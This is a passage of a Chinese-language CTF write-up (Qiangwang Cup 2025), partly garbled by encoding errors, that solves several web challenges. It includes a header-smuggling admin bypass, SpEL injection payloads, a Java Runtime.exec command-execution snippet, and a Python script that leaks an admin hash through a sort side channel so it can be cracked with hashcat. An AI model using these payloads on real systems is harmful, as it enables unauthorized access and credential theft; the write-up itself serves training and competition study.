<p>Goæ˜¯ä¸€ä¸ªç”¨äºå¤„ç†jwtçš„ç­¾åProxyï¼Œä¼šåˆ†åˆ«è¯»å–å¹¶delæ‰Authorizationã€X-Userã€XFFã€Cookieï¼Œä½†æ˜¯ä½ ä¼šå‘ç°X-Userä¸ºç©ºæ—¶ç›´æ¥ä¼ å‚ä¼šæ·»åŠ ä¸€ä¸ª0å€¼ï¼Œæ—¢ç„¶å®ƒæœ‰ä¸€ä¸ª/signè·¯ç”±ï¼Œåœ¨flaskä¸­ä¸»è¦åœ¨/dashboardä¸­åšæ–‡ç« ï¼Œä¼šå‘ç°ä¸€ä¸ªéå¸¸ç¥å¥‡çš„ç‚¹ï¼Œå¦‚æœæˆ‘æŠŠX-Userå¹²åˆ°connection: closeåé¢ï¼Œç”±äºä½¿ç”¨çš„æ˜¯çŸ­è¿æ¥ï¼Œå°±å¯ä»¥ç›´æ¥æ–°å»ºä¸€ä¸ªä¼šè¯ï¼Œå¦‚ä¸‹å›¾ï¼Œå› ä¸ºadminçš„uidä¸º 0ï¼Œé‚£ä¹ˆç”±äºæ²¡æœ‰X-Userå¯¹åº”çš„å€¼ï¼Œè¿™é‡Œå°±ä¼šç›´æ¥å½“æˆ uid ä¸º0äº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¢«è¯¯è®¤ä¸ºæ˜¯adminï¼Œéšåæ˜¾ç¤ºflagã€‚</p>
<p><strong>éœ€è¦å®šä¹‰</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http
</span></span><span class="line"><span class="cl">Connection: close, X-User
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/9.png"
	width="690"
	height="204"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/9_hu_847f77a9ec65871e.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/9_hu_28088a8f0e1f086c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="338"
		data-flex-basis="811px"
	
></p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/10.png"
	width="690"
	height="274"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/10_hu_7fb072d303862ee1.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/10_hu_c58e30ee6ea4dc55.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="604px"
	
></p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/11.png"
	width="690"
	height="335"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/11_hu_d47b2901220ff825.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/11_hu_e766253ad9c0aea6.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="205"
		data-flex-basis="494px"
	
></p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/12.png"
	width="690"
	height="372"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/12_hu_42725b7d5951541d.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/12_hu_d3f81645451284b3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="445px"
	
></p>
<h4 id="flag-5">flag
</h4><p>flag{15b2df1f-4780-4643-b029-978b22cd504e}</p>
<h3 id="bbtv">bbtv
</h3><h4 id="è§£é¢˜æ€è·¯-5">è§£é¢˜æ€è·¯
</h4><p>Spelç±»ä¸­ç¬¬ä¸€ä¸ªBeanå¯ä»¥é€šè¿‡SystemPropertiesçš„system.getPropertieså‡½æ•°æ¥è·å–å½“å‰ç³»ç»Ÿä¸­çš„é…ç½®å†…å®¹ï¼Œç¬¬äºŒä¸ªbeanç”¨äºæ‰§è¡Œä¸Šé¢çš„Beanï¼Œåœ¨/checkè·¯ç”±ä¸­é€šè¿‡ä¼ ruleå‚æ•°æ‰§è¡Œæäº¤çš„systemPropertiesç„¶åè½¬ç§»ç»™serviceè¿›è¡ŒæŸ¥è¯¢ï¼Œç”¨URLç¼–ç  #{#systemProperties[&lsquo;os.name&rsquo;]} ä¼ é€’è¿‡å»å‘ç°å¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/13.png"
	width="690"
	height="417"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/13_hu_ed25253e34d5c3a8.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/13_hu_aec92cc537525947.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="165"
		data-flex-basis="397px"
	
></p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/14.png"
	width="690"
	height="598"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/14_hu_65c25254b6727707.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/14_hu_5cf81d87b267facd.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="115"
		data-flex-basis="276px"
	
></p>
<p>controllerä¸­éœ€è¦æ³¨æ„çš„æ˜¯Fileåœ¨é€šè¿‡è·å–user.homeä¹‹åå¯ä»¥ç›´æ¥åœ¨/tmpä¸­è¯»å–flag.txtï¼ˆDockerfileé‡Œé¢æŠŠflag.txtç»™COPYåˆ°/tmp/flag.txtï¼‰</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/15.png"
	width="514"
	height="98"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/15_hu_59ad231df1d4edb8.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/15_hu_d539b47b029a34a1.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="524"
		data-flex-basis="1258px"
	
></p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/16.png"
	width="690"
	height="265"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/16_hu_d1f4376a64550555.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/16_hu_27872a79cdaff7bb.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="260"
		data-flex-basis="624px"
	
></p>
<p>é€šè¿‡æ„é€ Spelè¡¨è¾¾å¼æ‰§è¡Œ<code>#{#systemProperties['user.home'] = '/tmp'}</code>å³å¯ç›´æ¥è¯»å–åˆ°flag.txté‡Œé¢çš„å†…å®¹ï¼ˆä¸æŒ‡å®š/tmpä¼šé»˜è®¤è®¿é—®/rootå¯¼è‡´æ— æ³•è¯»å–flagï¼‰</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/17.png"
	width="690"
	height="380"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/17_hu_46b546616adf32c1.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/17_hu_20cf71d60b24859c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="181"
		data-flex-basis="435px"
	
></p>
<h4 id="flag-6">flag
</h4><p>flag{e116678c-bf91-4b4a-9d56-099bc6c5ca2d}</p>
<h3 id="yamcs">yamcs
</h3><h4 id="è§£é¢˜æ€è·¯-6">è§£é¢˜æ€è·¯
</h4><p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/18.png"
	width="690"
	height="482"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/18_hu_1e007b15ff12eeb7.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/18_hu_18e39721c79ec249.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="143"
		data-flex-basis="343px"
	
></p>
<p>è¿™ä¸ªåŠŸèƒ½ç‚¹å¯ä»¥æ‰§è¡Œä»£ç å¹¶è¾“å‡ºï¼Œç›´æ¥javaå‘½ä»¤æ‰§è¡Œæ”¹ä¸ªç±»å‹è¾“å‡ºåˆ°åŸæ¥çš„out0</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Process</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">Runtime</span><span class="p">.</span><span class="nx">getRuntime</span><span class="p">().</span><span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;cat /flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nb">String</span> <span class="nx">output</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">String</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">getInputStream</span><span class="p">().</span><span class="nx">readAllBytes</span><span class="p">(),</span> <span class="nx">java</span><span class="p">.</span><span class="nx">nio</span><span class="p">.</span><span class="nx">charset</span><span class="p">.</span><span class="nx">StandardCharsets</span><span class="p">.</span><span class="nx">UTF_8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">out0</span><span class="p">.</span><span class="nx">setStringValue</span><span class="p">(</span><span class="nx">output</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">out0</span><span class="p">.</span><span class="nx">setStringValue</span><span class="p">(</span><span class="s2">&#34;Error occurred&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-7">flag
</h4><p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/19.png"
	width="690"
	height="543"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/19_hu_5386e4e8ab2b11e.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/19_hu_61c30cdee55ec3bf.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="127"
		data-flex-basis="304px"
	
></p>
<h3 id="anime">anime
</h3><h4 id="è§£é¢˜æ€è·¯-7">è§£é¢˜æ€è·¯
</h4><p>åŸé¢˜ of HCMUS CTF 2025 Quals - MAL</p>
<p><a class="link" href="https://psdat123.github.io/posts/HCMUS-CTF-2025/"  target="_blank" rel="noopener"
    >https://psdat123.github.io/posts/HCMUS-CTF-2025/</a></p>
<p>æŸ¥çœ‹æºç å’Œwpï¼Œå†™ä¸ªè„šæœ¬çˆ†ä¸€ä¸‹</p>
<p>æ³¨ï¼šä»£ç éƒ¨åˆ†å†…å®¹æ¥è‡ªä¸Šè¿°wpï¼Œå¦‚æœ‰é›·åŒæ­£å¸¸ç°è±¡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;fadhilfaizullah&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">user_secret</span> <span class="o">=</span> <span class="s2">&#34;u2DAetreDVaTrL8leVf1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://47.105.120.74:1001/&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">admin_username</span> <span class="o">=</span> <span class="s2">&#34;TTXSMcc&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">sess</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s2">&#34;session&#34;</span><span class="p">:</span><span class="s2">&#34;eyJmbGFzaCI6e30sInBhc3Nwb3J0Ijp7InVzZXIiOiJmYWRoaWxmYWl6dWxsYWgifX0=&#34;</span><span class="p">,</span><span class="s2">&#34;session.sig&#34;</span><span class="p">:</span><span class="s2">&#34;v_MFDm1eMitgRSoZPC28Kghmqio&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">changeField</span><span class="p">(</span><span class="n">field_name</span><span class="p">,</span> <span class="n">guess_hash</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">  <span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="s1">&#39;/user/</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s1">/edit&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="n">field_name</span><span class="p">:</span> <span class="n">guess_hash</span><span class="p">,</span> <span class="s1">&#39;secret&#39;</span><span class="p">:</span> <span class="n">user_secret</span><span class="p">},</span><span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="n">res</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="s1">&#39;/users?sort=</span><span class="si">{</span><span class="n">field_name</span><span class="si">}</span><span class="s1">&amp;limit=1000&amp;skip=0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="n">users</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;class&#39;</span><span class="p">:</span> <span class="s1">&#39;anime_title&#39;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">admin_username</span> <span class="ow">in</span> <span class="n">user</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;test &#34;</span><span class="p">,</span><span class="n">guess_hash</span><span class="p">,</span><span class="s2">&#34; found &#34;</span><span class="p">,</span><span class="n">admin_username</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">username</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="nb">repr</span><span class="p">(</span><span class="n">user</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">      <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;test &#34;</span><span class="p">,</span><span class="n">guess_hash</span><span class="p">,</span><span class="s2">&#34; found &#34;</span><span class="p">,</span><span class="n">username</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1"># def leak_field(field_name, length, alphabet=&#34;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#34;,known_prefix=&#34;&#34;):</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leak_field</span><span class="p">(</span><span class="n">field_name</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">alphabet</span><span class="o">=</span><span class="s2">&#34;0123456789abcdef&#34;</span><span class="p">,</span><span class="n">known_prefix</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">field_value</span> <span class="o">=</span> <span class="n">known_prefix</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">known_prefix</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">L</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">R</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">L</span> <span class="o">&lt;=</span> <span class="n">R</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">M</span> <span class="o">=</span> <span class="p">(</span><span class="n">L</span> <span class="o">+</span> <span class="n">R</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">guess_char</span> <span class="o">=</span> <span class="n">alphabet</span><span class="p">[</span><span class="n">M</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_guess</span> <span class="o">=</span> <span class="n">field_value</span> <span class="o">+</span> <span class="n">guess_char</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="c1"># æµ‹è¯•å½“å‰çŒœæµ‹</span>
</span></span><span class="line"><span class="cl">            <span class="n">pos</span> <span class="o">=</span> <span class="n">changeField</span><span class="p">(</span><span class="n">field_name</span><span class="p">,</span> <span class="n">current_guess</span> <span class="o">+</span> <span class="n">alphabet</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="n">length</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">current_guess</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">pos</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># æˆ‘ä»¬çš„ç”¨æˆ·ååœ¨å½“å‰çŒœæµ‹ä¹‹å‰ï¼Œè¯´æ˜çŒœæµ‹çš„å­—ç¬¦å¤ªå¤§</span>
</span></span><span class="line"><span class="cl">                <span class="n">R</span> <span class="o">=</span> <span class="n">M</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># æˆ‘ä»¬çš„ç”¨æˆ·ååœ¨å½“å‰çŒœæµ‹ä¹‹åï¼Œè¯´æ˜çŒœæµ‹çš„å­—ç¬¦å¤ªå°æˆ–æ­£ç¡®</span>
</span></span><span class="line"><span class="cl">                <span class="n">L</span> <span class="o">=</span> <span class="n">M</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># æ‰¾åˆ°æ­£ç¡®å­—ç¬¦</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">L</span> <span class="o">&lt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;L=&#34;</span><span class="p">,</span><span class="n">L</span><span class="p">,</span><span class="s2">&#34; R=&#34;</span><span class="p">,</span><span class="n">R</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">position</span> <span class="o">!=</span> <span class="n">length</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">known_prefix</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">num</span> <span class="o">=</span> <span class="n">L</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">num</span> <span class="o">=</span> <span class="n">L</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">            <span class="n">field_value</span> <span class="o">+=</span> <span class="n">alphabet</span><span class="p">[</span><span class="n">num</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># å¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„å­—ç¬¦ï¼Œå¯èƒ½éœ€è¦å¤„ç†è¾¹ç•Œæƒ…å†µ</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;L=&#34;</span><span class="p">,</span><span class="n">L</span><span class="p">,</span><span class="s2">&#34; R=&#34;</span><span class="p">,</span><span class="n">R</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">field_value</span> <span class="o">+=</span> <span class="n">alphabet</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Progress: </span><span class="si">{</span><span class="n">field_value</span><span class="si">}</span><span class="s2"> [</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">field_value</span><span class="p">)</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">]&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">field_value</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Leaking admin hash&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">admin_hash</span> <span class="o">=</span> <span class="n">leak_field</span><span class="p">(</span><span class="s1">&#39;hash&#39;</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">known_prefix</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Leaking admin salt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">admin_salt</span> <span class="o">=</span> <span class="n">leak_field</span><span class="p">(</span><span class="s1">&#39;salt&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">known_prefix</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">hash_cat_string</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;sha256:25000:</span><span class="si">{</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">admin_salt</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">admin_hash</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] hashcat string: </span><span class="si">{</span><span class="n">hash_cat_string</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">hash_file</span> <span class="o">=</span> <span class="s2">&#34;hash&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">hash_file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">hash_cat_string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">hashcat_command</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;hashcat -a 3 -m 10900 </span><span class="si">{</span><span class="n">hash_file</span><span class="si">}</span><span class="s2"> ?d?d?d?d?d&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Run the following command to crack the password:</span><span class="se">\n</span><span class="si">{</span><span class="n">hashcat_command</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çˆ†å®Œhashcatå³å¯ï¼›å¾—åˆ°å¯†ç åç™»å½•ä¿å­˜ä¸€ä¸‹cookieã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">session=eyJwYXNzcG9ydCI6eyJ1c2VyIjoiVFRYU01jYyJ9LCJmbGFzaCI6e319; session.sig=1WywbgpLq6qXl37ncMrK1MV70gQ
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”±äºç®¡ç†å‘˜secretè¢«ç¼“å­˜ä¸ºrandom valueï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡ç¼“å­˜ï¼Œè€Œæ•°æ®åº“æ˜¯å¤§å°å†™ä¸æ•æ„Ÿï¼Œç¼“å­˜æ•æ„Ÿï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸åŒå¤§å°å†™çš„ç®¡ç†å‘˜idï¼Œå³å¯å¾—åˆ°flagã€‚</p>
<div class="highlight"><div class="chroma">
